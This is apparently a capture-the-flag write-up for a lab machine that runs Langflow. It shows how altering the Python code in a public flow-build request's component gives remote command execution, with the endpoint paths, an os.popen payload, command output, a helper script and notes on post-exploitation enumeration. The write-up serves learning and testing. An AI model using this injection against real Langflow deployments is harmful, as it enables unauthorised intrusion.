Summary

Fireflow is a Linux machine hosting an HTTPS web application for Task Force Nightfall. Initial enumeration revealed an nginx web server with a wildcard TLS certificate for fireflow.htb and *.fireflow.htb. The main site exposed a link to a Langflow playground on the subdomain flow.fireflow.htb.

The attack path began with web enumeration and traffic inspection in the browser. The Langflow playground was found to use a public flow endpoint under /api/v1/build_public_tmp/. By copying and modifying the request payload, I was able to replace the Python code inside the TextOperations component and obtain remote code execution as www-data. This was then converted into a reverse shell.

Post-exploitation enumeration revealed Langflow application data in /var/lib/langflow, including langflow.db, a secret_key file, and an MCP server configuration. Local service enumeration also showed Kubernetes-related services listening on localhost, including the Kubernetes API server on port 6443 and kubelet-related ports.

Langflow Request Analysis

Browser Network Inspection

In the browser developer tools, the Langflow playground generated a POST request to the public temporary build endpoint. The important endpoint was: 

/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?start_component_id=ChatInput-608En&log_builds=false&event_delivery=streaming

The response returned a job_id, which could then be used with the corresponding /events endpoint to retrieve the flow output. 

POST /api/v1/build_public_tmp/<flow_id>/flow  → returns job_id
GET  /api/v1/build_public_tmp/<job_id>/events → returns output/events

Flow Structure

The copied request payload showed the Langflow graph structure: 

ChatInput-608En → TextOperations-yvwhG → ChatOutput-gfxpD

The TextOperations-yvwhG node was responsible for replacing all user input with a canned response. Its configuration used a regex search pattern that matched everything. 

operation: Text Replace
search_pattern: ^.*$
use_regex: true
replacement_text: We are extremely sorry, this is still under development. Please, check back soon...

Initial Access

Manual Payload Modification

The request payload contained the Python code for the TextOperations component. By modifying the get_message() method inside the component code, I was able to make the server execute a system command and return the output in the Langflow response.

The original method looked like this:

def get_message(self) -> Message:
    """Return result as simple message with the processed text."""
    result = self.process_text()
    return Message(text=self._format_result_as_text(result))

The modified proof-of-execution method used os.popen():

def get_message(self) -> Message:
    import os
    return Message(text=os.popen("id").read())

Proof of Remote Code Execution

After posting the modified flow payload and fetching the job events, the server returned command output showing that code execution was achieved as www-data. 

uid=33(www-data) gid=33(www-data) groups=33(www-data)

Additional command execution confirmed the hostname and working directory: 

whoami; hostname; pwd
www-data
fireflow
/var/lib/langflow

Automation Script

To make command execution easier, I created a helper script named runflow.py. The script updates flow.json, replaces the command inside the get_message() method, posts the modified flow, and prints the job ID for manual event fetching. 

./runflow.py 'id'
./runflow.py 'whoami; hostname; pwd'

The key lesson was that the flow_id remains stable, but each POST creates a new job_id. 

Flow ID = which flow to run
Job ID  = this specific run's result

Lessons Learned

This machine reinforced the importance of inspecting browser network traffic when a web application hides important behavior behind a frontend. Directory brute forcing alone was not enough; the key discovery came from the POST request generated by the Langflow playground.

I also learned the difference between a stable flow_id and a per-run job_id. The flow_id identifies the Langflow graph to run, while the job_id identifies one specific execution and is used to fetch output from the /events endpoint.

Finally, the foothold showed how application-level RCE can lead into broader host and cluster enumeration. After gaining a shell as www-data, local services revealed Kubernetes components and internal Langflow/MCP functionality that were not directly accessible from the outside.
